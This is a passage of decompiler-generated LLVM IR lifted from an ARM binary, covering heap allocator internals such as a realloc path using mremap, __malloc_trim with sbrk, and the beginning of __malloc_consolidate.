  %v3_13f00 = inttoptr i32 %v2_13f00 to i32*
  %v4_13f00 = load i32, i32* %v3_13f00, align 4
  store i32 %v4_13f00, i32* %r3.global-to-local, align 4
  %v2_13f04 = load i32, i32* %r1.global-to-local, align 4
  %v3_13f04 = add i32 %v2_13f04, 28
  %v4_13f04 = inttoptr i32 %v3_13f04 to i32*
  store i32 %v4_13f00, i32* %v4_13f04, align 4
  %v1_13f08 = load i32, i32* @r5, align 4
  %v2_13f08 = add i32 %v1_13f08, 32
  %v3_13f08 = inttoptr i32 %v2_13f08 to i32*
  %v4_13f08 = load i32, i32* %v3_13f08, align 4
  store i32 %v4_13f08, i32* %r3.global-to-local, align 4
  %v2_13f0c = load i32, i32* %r1.global-to-local, align 4
  %v3_13f0c = add i32 %v2_13f0c, 32
  %v4_13f0c = inttoptr i32 %v3_13f0c to i32*
  store i32 %v4_13f08, i32* %v4_13f0c, align 4
  br label %.thread6

.thread6:                                         ; preds = %dec_label_pc_13eec, %dec_label_pc_13ed4, %dec_label_pc_13eb4, %dec_label_pc_13ea8, %bb32
  %v0_13f10 = load i32, i32* @r5, align 4
  store i32 %v0_13f10, i32* @r0, align 4
  %v0_13f14 = call i32 @free()
  store i32 %v0_13f14, i32* %r0.global-to-local, align 4
  %v0_13f18 = load i32, i32* @r7, align 4
  %v1_13f18 = add i32 %v0_13f18, 8
  store i32 %v1_13f18, i32* @r4, align 4
  br label %dec_label_pc_14054

dec_label_pc_13f20:                               ; preds = %bb30, %.thread2, %dec_label_pc_13e60
  %v0_13f34 = phi i32 [ %v3_13e90, %.thread2 ], [ %v1_13da8, %bb30 ], [ %v1_13f20.pre, %dec_label_pc_13e60 ]
  %v0_13f20 = load i32, i32* @sb, align 4
  %v2_13f20 = sub i32 %v0_13f34, %v0_13f20
  store i32 %v2_13f20, i32* %r1.global-to-local, align 4
  %v0_13f28 = load i32, i32* @sl, align 4
  %v1_13f28 = add i32 %v0_13f28, 4
  %v2_13f28 = inttoptr i32 %v1_13f28 to i32*
  %v3_13f28 = load i32, i32* %v2_13f28, align 4
  %tmp41 = icmp ugt i32 %v2_13f20, 15
  %v1_13f50 = urem i32 %v3_13f28, 2
  store i32 %v1_13f50, i32* %r3.global-to-local, align 4
  br i1 %tmp41, label %dec_label_pc_13f50, label %dec_label_pc_13f30

dec_label_pc_13f30:                               ; preds = %dec_label_pc_13f20
  %v2_13f34 = or i32 %v1_13f50, %v0_13f34
  store i32 %v2_13f34, i32* %r3.global-to-local, align 4
  store i32 %v2_13f34, i32* %v2_13f28, align 4
  %v0_13f3c = load i32, i32* @sl, align 4
  %v1_13f3c = load i32, i32* %r0.global-to-local, align 4
  %v2_13f3c = add i32 %v1_13f3c, %v0_13f3c
  store i32 %v2_13f3c, i32* %r2.global-to-local, align 4
  %v1_13f40 = add i32 %v2_13f3c, 4
  %v2_13f40 = inttoptr i32 %v1_13f40 to i32*
  %v3_13f40 = load i32, i32* %v2_13f40, align 4
  %v1_13f44 = or i32 %v3_13f40, 1
  store i32 %v1_13f44, i32* %r3.global-to-local, align 4
  store i32 %v1_13f44, i32* %v2_13f40, align 4
  br label %dec_label_pc_13f80

dec_label_pc_13f50:                               ; preds = %dec_label_pc_13f20
  %v2_13f54 = add i32 %v0_13f28, %v0_13f20
  store i32 %v2_13f54, i32* %r0.global-to-local, align 4
  %v2_13f58 = or i32 %v1_13f50, %v0_13f20
  store i32 %v2_13f58, i32* %r3.global-to-local, align 4
  %v1_13f5c = or i32 %v2_13f20, 1
  store i32 %v1_13f5c, i32* %r2.global-to-local, align 4
  store i32 %v2_13f58, i32* %v2_13f28, align 4
  %v0_13f64 = load i32, i32* %r2.global-to-local, align 4
  %v1_13f64 = load i32, i32* %r0.global-to-local, align 4
  %v2_13f64 = add i32 %v1_13f64, 4
  %v3_13f64 = inttoptr i32 %v2_13f64 to i32*
  store i32 %v0_13f64, i32* %v3_13f64, align 4
  %v0_13f68 = load i32, i32* %r0.global-to-local, align 4
  %v1_13f68 = load i32, i32* %r1.global-to-local, align 4
  %v2_13f68 = add i32 %v1_13f68, %v0_13f68
  store i32 %v2_13f68, i32* %r2.global-to-local, align 4
  %v1_13f6c = add i32 %v2_13f68, 4
  %v2_13f6c = inttoptr i32 %v1_13f6c to i32*
  %v3_13f6c = load i32, i32* %v2_13f6c, align 4
  %v1_13f70 = or i32 %v3_13f6c, 1
  store i32 %v1_13f70, i32* %r3.global-to-local, align 4
  store i32 %v1_13f70, i32* %v2_13f6c, align 4
  %v0_13f78 = load i32, i32* %r0.global-to-local, align 4
  %v1_13f78 = add i32 %v0_13f78, 8
  store i32 %v1_13f78, i32* @r0, align 4
  %v0_13f7c = call i32 @free()
  store i32 %v0_13f7c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_13f80

dec_label_pc_13f80:                               ; preds = %dec_label_pc_13f30, %dec_label_pc_13f50
  %v0_13f80 = load i32, i32* @sl, align 4
  %v1_13f80 = add i32 %v0_13f80, 8
  store i32 %v1_13f80, i32* @r4, align 4
  br label %dec_label_pc_14054

dec_label_pc_13f88:                               ; preds = %bb29
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_23010.367 to i32), i32* %r1.global-to-local, align 4
  %v4_13f90 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23010.367 to i32), i32 64) to i32*), align 4
  store i32 %v4_13f90, i32* @r8, align 4
  %v2_13f94 = inttoptr i32 %v1_13da4 to i32*
  %v3_13f94 = load i32, i32* %v2_13f94, align 4
  store i32 %v3_13f94, i32* @r4, align 4
  %v1_13f98 = add i32 %v4_13f90, 860
  %v2_13f98 = inttoptr i32 %v1_13f98 to i32*
  %v3_13f98 = load i32, i32* %v2_13f98, align 4
  %v1_13f9c = add i32 %v3_13f94, 4
  %v1_13fa0 = add i32 %v3_13f98, -1
  store i32 %v1_13fa0, i32* %r2.global-to-local, align 4
  %v2_13fa4 = add i32 %v1_13f9c, %v1_13fa0
  %v1_13fa8 = load i32, i32* @sb, align 4
  %v2_13fa8 = add i32 %v2_13fa4, %v1_13fa8
  store i32 %v2_13fa8, i32* %r3.global-to-local, align 4
  %v2_13fac = sub i32 0, %v3_13f98
  %v3_13fac = and i32 %v2_13fa8, %v2_13fac
  store i32 %v3_13fac, i32* @r7, align 4
  %v2_13fb0 = sub i32 %v3_13fac, %v3_13f94
  store i32 %v2_13fb0, i32* @fp, align 4
  %v9_13fb4 = icmp eq i32 %v1_13da8, %v2_13fb0
  br i1 %v9_13fb4, label %dec_label_pc_14028, label %dec_label_pc_13fbc

dec_label_pc_13fbc:                               ; preds = %dec_label_pc_13f88
  %v2_13fbc = sub i32 %v1_13da4, %v3_13f94
  store i32 %v2_13fbc, i32* %r0.global-to-local, align 4
  %v2_13fc0 = add i32 %v3_13f94, %v1_13da8
  store i32 %v2_13fc0, i32* %r1.global-to-local, align 4
  store i32 %v3_13fac, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v4_13fcc = call i32 @mremap(i32 %v2_13fbc, i32 %v2_13fc0, i32 %v3_13fac, i32 1)
  store i32 %v4_13fcc, i32* %r0.global-to-local, align 4
  %v7_13fd0 = icmp eq i32 %v4_13fcc, -1
  br i1 %v7_13fd0, label %dec_label_pc_1401c, label %dec_label_pc_13fd8

dec_label_pc_13fd8:                               ; preds = %dec_label_pc_13fbc
  %v1_13fd8 = load i32, i32* @r4, align 4
  %v2_13fd8 = add i32 %v1_13fd8, %v4_13fcc
  store i32 %v2_13fd8, i32* %r0.global-to-local, align 4
  %v0_13fdc = load i32, i32* @fp, align 4
  %v1_13fdc = or i32 %v0_13fdc, 2
  store i32 %v1_13fdc, i32* %r3.global-to-local, align 4
  %v2_13fe0 = add i32 %v2_13fd8, 4
  %v3_13fe0 = inttoptr i32 %v2_13fe0 to i32*
  store i32 %v1_13fdc, i32* %v3_13fe0, align 4
  %v0_13fe4 = load i32, i32* @r8, align 4
  %v1_13fe4 = add i32 %v0_13fe4, 868
  %v2_13fe4 = inttoptr i32 %v1_13fe4 to i32*
  %v3_13fe4 = load i32, i32* %v2_13fe4, align 4
  store i32 %v3_13fe4, i32* %r3.global-to-local, align 4
  %v1_13fe8 = add i32 %v0_13fe4, 880
  %v2_13fe8 = inttoptr i32 %v1_13fe8 to i32*
  %v3_13fe8 = load i32, i32* %v2_13fe8, align 4
  store i32 %v3_13fe8, i32* %r2.global-to-local, align 4
  %v0_13fec = load i32, i32* @r6, align 4
  %v2_13fec = sub i32 %v3_13fe4, %v0_13fec
  store i32 %v2_13fec, i32* %r3.global-to-local, align 4
  %v1_13ff0 = load i32, i32* @r7, align 4
  %v2_13ff0 = add i32 %v1_13ff0, %v2_13fec
  store i32 %v2_13ff0, i32* %r1.global-to-local, align 4
  %v1_13ff4 = add i32 %v0_13fe4, 872
  %v2_13ff4 = inttoptr i32 %v1_13ff4 to i32*
  %v3_13ff4 = load i32, i32* %v2_13ff4, align 4
  store i32 %v3_13ff4, i32* %r3.global-to-local, align 4
  %v1_13ffc = add i32 %v0_13fe4, 884
  %v2_13ffc = inttoptr i32 %v1_13ffc to i32*
  %v3_13ffc = load i32, i32* %v2_13ffc, align 4
  store i32 %v3_13ffc, i32* %r2.global-to-local, align 4
  %tmp42 = icmp ugt i32 %v2_13ff0, %v3_13fe8
  br i1 %tmp42, label %bb33, label %bb34

bb33:                                             ; preds = %dec_label_pc_13fd8
  store i32 %v2_13ff0, i32* %v2_13fe8, align 4
  %v0_14004.pre = load i32, i32* %r1.global-to-local, align 4
  %v1_14004.pre = load i32, i32* @r8, align 4
  br label %bb34

bb34:                                             ; preds = %dec_label_pc_13fd8, %bb33
  %v1_14004 = phi i32 [ %v0_13fe4, %dec_label_pc_13fd8 ], [ %v1_14004.pre, %bb33 ]
  %v0_14004 = phi i32 [ %v2_13ff0, %dec_label_pc_13fd8 ], [ %v0_14004.pre, %bb33 ]
  %v2_14004 = add i32 %v1_14004, 868
  %v3_14004 = inttoptr i32 %v2_14004 to i32*
  store i32 %v0_14004, i32* %v3_14004, align 4
  %v0_14008 = load i32, i32* %r1.global-to-local, align 4
  %v1_14008 = load i32, i32* %r3.global-to-local, align 4
  %v2_14008 = add i32 %v1_14008, %v0_14008
  store i32 %v2_14008, i32* %r1.global-to-local, align 4
  %v1_1400c = load i32, i32* %r2.global-to-local, align 4
  %v0_14010 = load i32, i32* %r0.global-to-local, align 4
  %v1_14010 = add i32 %v0_14010, 8
  store i32 %v1_14010, i32* @r4, align 4
  %tmp43 = icmp ugt i32 %v2_14008, %v1_1400c
  br i1 %tmp43, label %bb35, label %dec_label_pc_14054

bb35:                                             ; preds = %bb34
  %v5_14014 = load i32, i32* @r8, align 4
  %v6_14014 = add i32 %v5_14014, 884
  %v7_14014 = inttoptr i32 %v6_14014 to i32*
  store i32 %v2_14008, i32* %v7_14014, align 4
  br label %dec_label_pc_14054

dec_label_pc_1401c:                               ; preds = %dec_label_pc_13fbc
  %v0_1401c = load i32, i32* @sb, align 4
  %v1_1401c = add i32 %v0_1401c, 4
  store i32 %v1_1401c, i32* %r3.global-to-local, align 4
  %v0_14020 = load i32, i32* @r6, align 4
  %v3_14020 = icmp ult i32 %v0_14020, %v1_1401c
  br i1 %v3_14020, label %dec_label_pc_14030, label %dec_label_pc_1401c.dec_label_pc_14028_crit_edge

dec_label_pc_1401c.dec_label_pc_14028_crit_edge:  ; preds = %dec_label_pc_1401c
  %v0_14028.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_14028

dec_label_pc_14028:                               ; preds = %dec_label_pc_1401c.dec_label_pc_14028_crit_edge, %dec_label_pc_13f88
  %v0_14028 = phi i32 [ %v0_14028.pre, %dec_label_pc_1401c.dec_label_pc_14028_crit_edge ], [ %v0_13d90, %dec_label_pc_13f88 ]
  store i32 %v0_14028, i32* @r4, align 4
  br label %dec_label_pc_14054

dec_label_pc_14030:                               ; preds = %dec_label_pc_1401c
  %v1_14030 = add i32 %v0_1401c, -7
  store i32 %v1_14030, i32* @r0, align 4
  %v0_14034 = call i32 @malloc()
  store i32 %v0_14034, i32* @r0, align 4
  store i32 %v0_14034, i32* @r4, align 4
  %v2_14038 = icmp eq i32 %v0_14034, 0
  br i1 %v2_14038, label %dec_label_pc_14054, label %dec_label_pc_14040

dec_label_pc_14040:                               ; preds = %dec_label_pc_14030
  %v0_14040 = load i32, i32* @r6, align 4
  %v1_14040 = add i32 %v0_14040, -8
  store i32 %v1_14040, i32* @r2, align 4
  %v0_14044 = load i32, i32* @r5, align 4
  store i32 %v0_14044, i32* @r1, align 4
  %v0_14048 = call i32 @memcpy()
  %v0_1404c = load i32, i32* @r5, align 4
  store i32 %v0_1404c, i32* @r0, align 4
  %v0_14050 = call i32 @free()
  store i32 %v0_14050, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_14054

dec_label_pc_14054:                               ; preds = %bb31, %bb35, %bb34, %dec_label_pc_14030, %dec_label_pc_14028, %dec_label_pc_13f80, %.thread6, %dec_label_pc_13df0, %dec_label_pc_14040
  store i32 %v2_13d3c, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 44, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_23010.367 to i32), i32* %r2.global-to-local, align 4
  %v4_14064 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23010.367 to i32), i32 44) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_14064)
  br label %dec_label_pc_14070

dec_label_pc_14070:                               ; preds = %dec_label_pc_13d70, %dec_label_pc_13d18, %dec_label_pc_13d00, %dec_label_pc_14054
  %v0_14070 = load i32, i32* @r4, align 4
  store i32 %v0_14070, i32* %r0.global-to-local, align 4
  store i32 %v3_13ce0, i32* @r4, align 4
  store i32 %v6_13ce0, i32* @r5, align 4
  store i32 %v9_13ce0, i32* @r6, align 4
  store i32 %v12_13ce0, i32* @r7, align 4
  store i32 %v15_13ce0, i32* @r8, align 4
  store i32 %v18_13ce0, i32* @sb, align 4
  store i32 %v21_13ce0, i32* @sl, align 4
  store i32 %v24_13ce0, i32* @fp, align 4
  store i32 %v27_13ce0, i32* @lr, align 4
  ret i32 %v0_14070

; uselistorder directives
  uselistorder i32 %v2_14008, { 1, 0, 2 }
  uselistorder i32 %v2_13ff0, { 1, 2, 0, 3 }
  uselistorder i32 %v4_13fcc, { 1, 0, 2 }
  uselistorder i32 %v3_13fac, { 1, 0, 2, 3 }
  uselistorder i32 %v1_13f50, { 2, 1, 0 }
  uselistorder i32 %v2_13f20, { 1, 0, 2 }
  uselistorder i32 %v0_13eb4, { 1, 0 }
  uselistorder i32 %v0_13e70, { 0, 2, 1, 3, 4, 5 }
  uselistorder i32 %v3_13dd4, { 0, 2, 1, 3 }
  uselistorder i32 %v2_13dcc, { 1, 2, 3, 0, 4, 5, 6 }
  uselistorder i32 %v1_13db0, { 3, 5, 0, 1, 2, 4, 6 }
  uselistorder i32 %v1_13da8, { 0, 7, 5, 1, 2, 3, 4, 6, 8, 9 }
  uselistorder i32 %v1_13da4, { 2, 3, 0, 1, 4 }
  uselistorder i1 %v2_13d94, { 1, 0 }
  uselistorder i32 %v0_13d90, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v0_13d68, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 1, 7, 2, 3, 4, 5, 6, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 2, 3, 4, 6, 5, 11, 7, 8, 9, 10, 21, 12, 14, 13, 20, 22, 15, 16, 17, 18, 19, 25, 24, 23, 26, 27 }
  uselistorder i32 %arg2, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_14070, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_14054, { 8, 3, 4, 1, 2, 5, 6, 0, 7 }
  uselistorder label %bb34, { 1, 0 }
  uselistorder label %dec_label_pc_13f80, { 1, 0 }
  uselistorder label %dec_label_pc_13f20, { 1, 2, 0 }
  uselistorder label %.thread6, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_13e6c, { 1, 2, 0 }
  uselistorder label %dec_label_pc_13e60, { 1, 0 }
  uselistorder label %dec_label_pc_13e5c, { 1, 0 }
  uselistorder label %bb29, { 1, 0 }
  uselistorder label %bb27, { 1, 0 }
}

define i32 @function_14084(i32 %arg1) local_unnamed_addr {
dec_label_pc_14084:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v0_14084 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_14084, label %.thread3, label %.thread5

.thread3:                                         ; preds = %dec_label_pc_14084
  store i32 0, i32* %r0.global-to-local, align 4
  call void @__pseudo_branch(i32 0)
  %v0_14098.pr.pr.pr = load i1, i1* @cpsr_z, align 1
  br i1 %v0_14098.pr.pr.pr, label %bb, label %.thread3..thread5_crit_edge

.thread3..thread5_crit_edge:                      ; preds = %.thread3
  %v4_1409c.pre = load i32, i32* %r0.global-to-local, align 4
  br label %.thread5

bb:                                               ; preds = %.thread3
  store i32 0, i32* %r0.global-to-local, align 4
  br label %.thread5

.thread5:                                         ; preds = %.thread3..thread5_crit_edge, %dec_label_pc_14084, %bb
  %v4_1409c = phi i32 [ %v4_1409c.pre, %.thread3..thread5_crit_edge ], [ %arg1, %dec_label_pc_14084 ], [ 0, %bb ]
  ret i32 %v4_1409c

; uselistorder directives
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 0 }
  uselistorder label %.thread5, { 2, 0, 1 }
}

define i32 @__malloc_trim(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v1_140a0 = add i32 %arg2, 44
  %v2_140a0 = inttoptr i32 %v1_140a0 to i32*
  %v3_140a0 = load i32, i32* %v2_140a0, align 4
  %v12_140a4 = load i32, i32* @r7, align 4
  %v1_140a8 = add i32 %v3_140a0, 4
  %v2_140a8 = inttoptr i32 %v1_140a8 to i32*
  %v3_140a8 = load i32, i32* %v2_140a8, align 4
  %v1_140ac = add i32 %arg2, 860
  %v2_140ac = inttoptr i32 %v1_140ac to i32*
  %v3_140ac = load i32, i32* %v2_140ac, align 4
  store i32 %v3_140ac, i32* @r4, align 4
  %v1_140b0 = and i32 %v3_140a8, -4
  store i32 %v1_140b0, i32* @r6, align 4
  %v1_140b4 = add i32 %v1_140b0, -17
  %v2_140b8 = add i32 %v1_140b4, %v3_140ac
  store i32 %arg2, i32* @r5, align 4
  %v2_140c4 = sub i32 %v2_140b8, %arg1
  store i32 %v3_140ac, i32* %r1.global-to-local, align 4
  %v2_140cc = udiv i32 %v2_140c4, %v3_140ac
  %v1_140d0 = add i32 %v2_140cc, -1
  store i32 %v1_140d0, i32* %r0.global-to-local, align 4
  %v2_140d4 = mul i32 %v1_140d0, %v3_140ac
  store i32 %v2_140d4, i32* @r7, align 4
  %v2_140d8 = icmp eq i32 %v2_140d4, 0
  store i1 %v2_140d8, i1* @cpsr_z, align 1
  %tmp8 = icmp slt i32 %v2_140d4, 1
  br i1 %tmp8, label %dec_label_pc_14140, label %dec_label_pc_140e0

dec_label_pc_140e0:                               ; preds = %entry
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_140e4 = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_140e4, i32* %r0.global-to-local, align 4
  %v0_140e8 = load i32, i32* @r5, align 4
  %v1_140e8 = add i32 %v0_140e8, 44
  %v2_140e8 = inttoptr i32 %v1_140e8 to i32*
  %v3_140e8 = load i32, i32* %v2_140e8, align 4
  %v0_140ec = load i32, i32* @r6, align 4
  %v2_140ec = add i32 %v0_140ec, %v3_140e8
  %v9_140f0 = icmp eq i32 %v1_140e4, %v2_140ec
  store i1 %v9_140f0, i1* @cpsr_z, align 1
  store i32 %v1_140e4, i32* @r4, align 4
  br i1 %v9_140f0, label %dec_label_pc_140fc, label %dec_label_pc_14140

dec_label_pc_140fc:                               ; preds = %dec_label_pc_140e0
  %v0_140fc = load i32, i32* @r7, align 4
  %v1_140fc = sub i32 0, %v0_140fc
  store i32 %v1_140fc, i32* %r0.global-to-local, align 4
  %v1_14100 = call i32 @__GI_sbrk(i32 %v1_140fc)
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_14108 = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_14108, i32* %r0.global-to-local, align 4
  %v7_1410c = icmp eq i32 %v1_14108, -1
  store i1 %v7_1410c, i1* @cpsr_z, align 1
  br i1 %v7_1410c, label %dec_label_pc_14140, label %dec_label_pc_14114

dec_label_pc_14114:                               ; preds = %dec_label_pc_140fc
  %v0_14114 = load i32, i32* @r4, align 4
  %v2_14114 = sub i32 %v0_14114, %v1_14108
  store i32 %v2_14114, i32* %r0.global-to-local, align 4
  %v9_14114 = icmp eq i32 %v0_14114, %v1_14108
  store i1 %v9_14114, i1* @cpsr_z, align 1
  br i1 %v9_14114, label %dec_label_pc_14140, label %dec_label_pc_1411c

dec_label_pc_1411c:                               ; preds = %dec_label_pc_14114
  %v0_1411c = load i32, i32* @r5, align 4
  %v1_1411c = add i32 %v0_1411c, 872
  %v2_1411c = inttoptr i32 %v1_1411c to i32*
  %v3_1411c = load i32, i32* %v2_1411c, align 4
  %v1_14120 = load i32, i32* @r6, align 4
  %v2_14120 = sub i32 %v1_14120, %v2_14114
  store i32 %v2_14120, i32* %r2.global-to-local, align 4
  %v1_14124 = add i32 %v0_1411c, 44
  %v2_14124 = inttoptr i32 %v1_14124 to i32*
  %v3_14124 = load i32, i32* %v2_14124, align 4
  store i32 %v3_14124, i32* %r1.global-to-local, align 4
  %v2_14128 = sub i32 %v3_1411c, %v2_14114
  %v1_1412c = or i32 %v2_14120, 1
  store i32 %v1_1412c, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  store i32 %v2_14128, i32* %v2_1411c, align 4
  %v0_14138 = load i32, i32* %r2.global-to-local, align 4
  %v1_14138 = load i32, i32* %r1.global-to-local, align 4
  %v2_14138 = add i32 %v1_14138, 4
  %v3_14138 = inttoptr i32 %v2_14138 to i32*
  store i32 %v0_14138, i32* %v3_14138, align 4
  %v1_1414c.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_14144

dec_label_pc_14140:                               ; preds = %dec_label_pc_140e0, %dec_label_pc_14114, %dec_label_pc_140fc, %entry
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_14144

dec_label_pc_14144:                               ; preds = %dec_label_pc_1411c, %dec_label_pc_14140
  %v1_1414c = phi i32 [ %v1_1414c.pre, %dec_label_pc_1411c ], [ 0, %dec_label_pc_14140 ]
  store i32 %v12_140a4, i32* @r7, align 4
  ret i32 %v1_1414c

; uselistorder directives
  uselistorder i1 %v7_1410c, { 1, 0 }
  uselistorder i32 %v1_14108, { 2, 1, 0, 3 }
  uselistorder i32 %v3_140ac, { 0, 2, 1, 3, 4 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 5, 7, 6, 10, 9, 8, 0 }
  uselistorder i32 872, { 1, 0, 2, 3, 4, 5, 6, 7 }
  uselistorder i32 %arg2, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_14144, { 1, 0 }
  uselistorder label %dec_label_pc_14140, { 1, 2, 0, 3 }
}

define i32 @__malloc_consolidate() local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_14150 = load i32, i32* @r4, align 4
  store i32 %v3_14150, i32* %stack_var_-36, align 4
  %v0_14154 = load i32, i32* @r0, align 4
  %v1_14154 = inttoptr i32 %v0_14154 to i32*
  %v2_14154 = load i32, i32* %v1_14154, align 4
  store i32 %v2_14154, i32* %r3.global-to-local, align 4
  %v2_14158 = icmp eq i32 %v2_14154, 0
  store i32 %v0_14154, i32* @r4, align 4
  br i1 %v2_14158, label %dec_label_pc_14290.preheader, label %dec_label_pc_1416c

dec_label_pc_14290.preheader:                     ; preds = %entry
  store i32 2, i32* %r2.global-to-local, align 4
  %v1_1429825 = add i32 %v0_14154, 52
  store i32 %v1_1429825, i32* %r3.global-to-local, align 4
  %v2_142a026 = add i32 %v0_14154, 60
  %v3_142a027 = inttoptr i32 %v2_142a026 to i32*
  store i32 %v1_1429825, i32* %v3_142a027, align 4
  %v0_142a428 = load i32, i32* %r3.global-to-local, align 4
  %v2_142a429 = add i32 %v0_142a428, 12
  %v3_142a430 = inttoptr i32 %v2_142a429 to i32*
  store i32 %v0_142a428, i32* %v3_142a430, align 4
  br label %dec_label_pc_14290.dec_label_pc_14290_crit_edge

dec_label_pc_1416c:                               ; preds = %entry
  %v1_1416c = and i32 %v2_14154, -3
  %v3_14170 = udiv i32 %v2_14154, 8
  store i32 %v3_14170, i32* %r2.global-to-local, align 4
  store i32 %v1_1416c, i32* %v1_14154, align 4
  %v0_14178 = load i32, i32* @r0, align 4
  %v1_14178 = add i32 %v0_14178, -4
  store i32 %v1_14178, i32* %r3.global-to-local, align 4
  %v1_1417c = load i32, i32* %r2.global-to-local, align 4
  %v4_1417c = mul i32 %v1_1417c, 4
  %v5_1417c = add i32 %v4_1417c, %v1_14178
  store i32 %v5_1417c, i32* %sb.global-to-local, align 4
  %v1_14180 = add i32 %v0_14178, 52
  store i32 %v1_14180, i32* %r7.global-to-local, align 4
  %v1_14184 = add i32 %v0_14178, 4
  store i32 %v1_14184, i32* %r6.global-to-local, align 4
  store i32 0, i32* %fp.global-to-local, align 4
  br label %dec_label_pc_1418c

dec_label_pc_1418c:                               ; preds = %dec_label_pc_14288, %dec_label_pc_1416c
  %v1_1428010 = phi i32 [ %v1_14280, %dec_label_pc_14288 ], [ %v5_1417c, %dec_label_pc_1416c ]
  %v1_14198 = phi i32 [ %v1_14288, %dec_label_pc_14288 ], [ %v1_14184, %dec_label_pc_1416c ]
  %v1_1418c = inttoptr i32 %v1_14198 to i32*
  %v2_1418c = load i32, i32* %v1_1418c, align 4
  store i32 %v2_1418c, i32* %r1.global-to-local, align 4
  %v2_14190 = icmp eq i32 %v2_1418c, 0
  br i1 %v2_14190, label %dec_label_pc_14280, label %dec_label_pc_14198

dec_label_pc_14198:                               ; preds = %dec_label_pc_1418c
  %v0_14198 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_14198, i32* %v1_1418c, align 4
  %v0_1419c.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1419c

dec_label_pc_1419c:                               ; preds = %dec_label_pc_14274, %dec_label_pc_14198
  %v0_141b8 = phi i32 [ %v0_14274, %dec_label_pc_14274 ], [ %v0_1419c.pre, %dec_label_pc_14198 ]
  %v1_1419c = add i32 %v0_141b8, 4
  %v2_1419c = inttoptr i32 %v1_1419c to i32*
  %v3_1419c = load i32, i32* %v2_1419c, align 4
  store i32 %v3_1419c, i32* %r3.global-to-local, align 4
  %v1_141a0 = and i32 %v3_1419c, -2
  store i32 %v1_141a0, i32* %lr.global-to-local, align 4
  %v2_141a4 = add i32 %v1_141a0, %v0_141b8
  store i32 %v2_141a4, i32* @r0, align 4
  %v1_141a8 = urem i32 %v3_1419c, 2
  %v2_141a8 = icmp eq i32 %v1_141a8, 0
  %v1_141ac = add i32 %v0_141b8, 8
  %v2_141ac = inttoptr i32 %v1_141ac to i32*
  %v3_141ac = load i32, i32* %v2_141ac, align 4
  store i32 %v3_141ac, i32* %sl.global-to-local, align 4
  %v1_141b0 = add i32 %v2_141a4, 4
  %v2_141b0 = inttoptr i32 %v1_141b0 to i32*
  %v3_141b0 = load i32, i32* %v2_141b0, align 4
  store i32 %v3_141b0, i32* %r8.global-to-local, align 4
  br i1 %v2_141a8, label %dec_label_pc_141b8, label %dec_label_pc_141ec

dec_label_pc_141b8:                               ; preds = %dec_label_pc_1419c
  %v1_141b8 = inttoptr i32 %v0_141b8 to i32*
  %v2_141b8 = load i32, i32* %v1_141b8, align 4
  store i32 %v2_141b8, i32* %r5.global-to-local, align 4
  %v2_141bc = sub i32 %v0_141b8, %v2_141b8
  store i32 %v2_141bc, i32* %r3.global-to-local, align 4
  %v1_141c0 = add i32 %v2_141bc, 8
  %v2_141c0 = inttoptr i32 %v1_141c0 to i32*
  %v3_141c0 = load i32, i32* %v2_141c0, align 4
  store i32 %v3_141c0, i32* @ip, align 4
  %v1_141c4 = add i32 %v3_141c0, 12
  %v2_141c4 = inttoptr i32 %v1_141c4 to i32*
  %v3_141c4 = load i32, i32* %v2_141c4, align 4
  store i32 %v3_141c4, i32* %r1.global-to-local, align 4
  %v9_141c8 = icmp eq i32 %v3_141c4, %v2_141bc
